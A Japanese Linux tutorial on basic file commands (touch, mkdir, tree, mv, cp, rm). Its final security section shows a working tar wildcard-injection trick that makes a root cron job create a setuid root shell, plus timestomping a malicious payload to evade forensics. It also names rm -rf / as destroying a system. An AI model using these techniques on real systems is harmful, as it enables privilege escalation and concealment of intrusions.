## 重要な用語

この教材でよく出てくる言葉である。

| 用語 | 意味 |
|:---|:---|
| ファイルとディレクトリ | ファイルはデータを持ち、ディレクトリ(フォルダ)はファイルを持つ |
| `cp` / `mv` / `rm` | コピー / 移動または名前変更 / 削除 |
| `touch` / `mkdir` | 空ファイルを作る / ディレクトリを作る |
| ワイルドカード(glob) | `*` と `?` で多くの名前を一度に一致させる(`*.log`) |
| 隠しファイル | 名前が `.` で始まる、既定で表示されないファイル |
| inode | ファイルのメタデータを保持するディスク上の記録 |
| ハード / ソフトリンク | 1つのファイルへの2つの名前 / 別パスへの指し示し |

## 1. Linux と Windows のファイル管理の違い

Linux と Windows のファイル管理の主な違いは、アクセス方法にあります。Windows では通常 Explorer のようなグラフィカルツールを使いますが、Linux ではターミナルがはるかに強力な代替手段になります。

- わずかなコマンドで高速に処理できる。
- 正規表現を使ってファイルを選択的に編集できる。
- 複数のコマンドを一度に実行できる。
- 多数のファイルにまたがるバッチ編集を自動化できる。

---

## 2. `touch`、空のファイルを作成

`touch` は新しい空のファイルを作成するコマンドです。ファイルが既に存在する場合は、内容を変えずにタイムスタンプだけを更新します。

```bash
# Syntax
touch <filename>

# Create a single file
$ touch info.txt

# Create multiple files at once
$ touch file1.txt file2.txt file3.txt

# Create a file inside a specific directory
$ touch ./Storage/local/user/userinfo.txt
```

補足: `.`（ドット1つ)はカレントディレクトリを指します。`./path/file` の形式を使うと、絶対パスを全部入力しなくても現在の場所を基準に作業できます。

---

## 3. `mkdir`、ディレクトリを作成

`mkdir`(make directory)は新しいディレクトリを作成するコマンドです。`-p` フラグを付けると、ネストしたディレクトリを一度に作成できます。`-p` を付けない場合、親ディレクトリが存在しなければコマンドは失敗します。

```bash
# Syntax
mkdir <directory_name>

# Create a single directory
$ mkdir Storage

# Create nested directories in one command (-p = parents)
$ mkdir -p Storage/local/user/documents
```

| フラグ | 機能 |
|------|--------|
| `-p` | 親ディレクトリを自動作成 |
| `-v` | 作成した各ディレクトリの詳細を表示 |
| `-m` | 作成時にパーミッションを設定 |

---

## 4. `tree`、ディレクトリ構造を可視化

`tree` はディレクトリ構造をツリー形式で視覚的に表示します。ネストしたディレクトリ作成の結果を確認するのに便利です。

```bash
# View current directory structure
$ tree .

.
├── info.txt
└── Storage
    └── local
        └── user
            └── documents

4 directories, 1 file

# After creating more files
$ touch ./Storage/local/user/userinfo.txt
$ tree .

.
├── info.txt
└── Storage
    └── local
        └── user
            ├── documents
            └── userinfo.txt

4 directories, 2 files
```

## 5. `mv`、ファイルの移動と名前変更

`mv`(move)は2つの役割を持ちます。ファイルやディレクトリを別の場所へ移動することと、名前を変更することです。どちらも同じコマンドで行い、違いは与える引数だけです。

```bash
# Syntax
mv <source> <destination>

# ── RENAME a file ──────────────────────────────────
$ mv info.txt information.txt

# ── MOVE a single file to a directory ──────────────
$ mv information.txt Storage/

# ── MOVE multiple files to a directory ─────────────
$ mv information.txt readme.txt Storage/

$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt

4 directories, 3 files

# ── MOVE and RENAME at the same time ───────────────
$ mv Storage/readme.txt Storage/local/READ_ME.txt
```

注意: 移動先に同名のファイルが既にある場合、`mv` は警告なしに上書きします。`mv -i`(interactive)を使うと、上書き前に確認を求められます。

```bash
# Safe move with confirmation
$ mv -i info.txt Storage/
mv: overwrite 'Storage/info.txt'? y
```

## 6. `cp`、ファイルとディレクトリのコピー

`cp`(copy)はファイルやディレクトリを新しい場所にコピーするコマンドです。元のファイルはそのまま残ります。ディレクトリとその中身をすべてコピーするには `-r`(recursive)フラグを使います。

```bash
# Syntax
cp <source> <destination>

# Copy a file to another directory
$ cp Storage/readme.txt Storage/local/

$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   ├── readme.txt           ← copied here
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt               ← original still here

4 directories, 4 files

# Copy entire directory (recursive)
$ cp -r Storage/ Storage_backup/

# Copy and preserve permissions/timestamps
$ cp -rp Storage/ Storage_backup/
```

| フラグ | 機能 |
|------|--------|
| `-r` | ディレクトリを再帰的にコピー |
| `-p` | パーミッションとタイムスタンプを保持 |
| `-i` | 上書き前に確認 |
| `-v` | コピーされるファイルを表示 |

## 7. `rm`、ファイルとディレクトリの削除

`rm`(remove)はファイルやディレクトリを削除するコマンドです。注意: Linux にはゴミ箱がありません。`rm` で削除したファイルは通常の方法では復元できません。特に `-rf` フラグを使うときは十分注意してください。

```bash
# Delete a single file
$ rm info.txt

# Delete with confirmation prompt (-i = interactive)
$ rm -i info.txt
rm: remove regular file 'info.txt'? y

# Delete an empty directory
$ rmdir Storage/local/user/documents

# Delete a directory and ALL its contents (DANGEROUS!)
$ rm -r Storage/

# Force delete without any prompts (USE WITH EXTREME CAUTION)
$ rm -rf Storage/
```

| フラグ | 機能 |
|------|--------|
| `-r` | ディレクトリを再帰的に削除 |
| `-f` | 確認なしで強制削除 |
| `-i` | 削除ごとに確認 |
| `-v` | 削除されるファイルを表示 |

危険: `rm -rf /` や `rm -rf /*` はシステム上のすべてを削除します。このコマンドは絶対に実行しないでください。取り消しはできず、ファイルシステム全体が破壊されます。

## 8. 一連のワークフロー例

```bash
# 1. Create directory structure
$ mkdir -p Storage/local/user/documents

# 2. Create files
$ touch info.txt
$ touch ./Storage/local/user/userinfo.txt

# 3. Verify structure
$ tree .
.
├── info.txt
└── Storage
    └── local
        └── user
            ├── documents
            └── userinfo.txt

# 4. Rename a file
$ mv info.txt information.txt

# 5. Move files into Storage
$ touch readme.txt
$ mv information.txt readme.txt Storage/

# 6. Copy readme.txt to local/
$ cp Storage/readme.txt Storage/local/

# 7. Verify final structure
$ tree .
.
└── Storage
    ├── information.txt
    ├── local
    │   ├── readme.txt
    │   └── user
    │       ├── documents
    │       └── userinfo.txt
    └── readme.txt

# 8. Clean up: delete the entire Storage directory
$ rm -r Storage/
```

## 9. コマンド早見表

| コマンド | 機能 | 例 |
|----------|--------|--------|
| `touch` | 空ファイルを作成 | `touch file.txt` |
| `mkdir` | ディレクトリを作成 | `mkdir Storage` |
| `mkdir -p` | ネストしたディレクトリを作成 | `mkdir -p a/b/c` |
| `tree` | 構造を表示 | `tree .` |
| `mv` | 移動・名前変更 | `mv a.txt b.txt` |
| `cp` | ファイルをコピー | `cp a.txt dir/` |
| `cp -r` | ディレクトリをコピー | `cp -r dir1/ dir2/` |
| `rm` | ファイルを削除 | `rm file.txt` |
| `rm -r` | ディレクトリを削除 | `rm -r Storage/` |
| `rmdir` | 空ディレクトリを削除 | `rmdir emptydir/` |

## 10. セキュリティノート: ワイルドカードインジェクション、タイムストンプ、安全な削除

ペネトレーションテスト、デジタルフォレンジクス、システム管理において、次の3点は押さえておく必要があります。

1. Unix ワイルドカードインジェクション(`*` の悪用): 書き込み可能なディレクトリ(`/tmp` や Web アップロード用フォルダ)で、自動スクリプトや管理者が `tar -czf backup.tar.gz *` や `chown user:user *` のようなコマンドを実行すると、攻撃者は `--checkpoint=1` や `--checkpoint-action=exec=sh exploit.sh` のようにコマンドのフラグに似せた名前のファイルを配置し、スクリプトを実行するユーザーの権限で任意のコードを実行させられます。
2. アンチフォレンジックなタイムストンプ: `touch -t YYYYMMDDhhmm.ss` や `touch -r reference_file` を使うと、バックドアファイルのタイムスタンプ(アクセス日時・更新日時)を書き換えて正規のシステムファイルになじませることができます。
3. `shred` による安全な削除: `rm` によるファイル削除は、ファイルシステム上の inode ポインタを外すだけです。生データ自体は Autopsy や TestDisk のようなフォレンジックツールで復元できてしまいます。`shred -u -z -n 3 file.txt` を使うと、削除前にバイナリデータを複数回上書きできます。

```bash
# ── WILDCARD INJECTION DEMO (TAR ARBITRARY CODE EXECUTION) ───
$ echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /var/www/uploads/shell.sh
$ touch /var/www/uploads/--checkpoint=1
$ touch /var/www/uploads/--checkpoint-action=exec=sh\ shell.sh
# When root cron runs: tar -czf backup.tar.gz /var/www/uploads/*
# Root executes shell.sh!

# ── TIMESTOMPING ANTI-FORENSICS ──────────────────────────────
# Match timestamp of malicious payload to /bin/ls
$ touch -r /bin/ls malicious_payload.so
$ stat malicious_payload.so

# ── SECURE DELETION ──────────────────────────────────────────
# Overwrite 3 times with random data, add final zero pass, and remove
$ shred -u -z -n 3 sensitive_credentials.txt
```

## クイックリファレンス

```bash
# Create
touch filename.txt                    # empty file
touch -r ref_file target.txt          # match timestamp
mkdir dirname                         # directory
mkdir -p parent/child/grandchild      # nested directories
touch ./parent/child/file.txt         # file in specific path

# View structure
tree .                                # current directory tree
tree /path/to/dir                     # specific directory tree

# Move / Rename
mv old.txt new.txt                    # rename
mv file.txt dir/                      # move to directory
mv file1 file2 dir/                   # move multiple files
mv -i file.txt dir/                   # safe move (confirm overwrite)

# Copy
cp file.txt dir/                      # copy file to directory
cp -r dir1/ dir2/                     # copy entire directory
cp -rp dir1/ dir2/                    # copy + preserve permissions

# Delete
rm file.txt                           # delete file
rm -i file.txt                        # delete with confirmation
rm -r dirname/                        # delete directory
rmdir emptydir/                       # delete empty directory only
shred -u -z -n 3 secret.txt           # secure data wipe
```
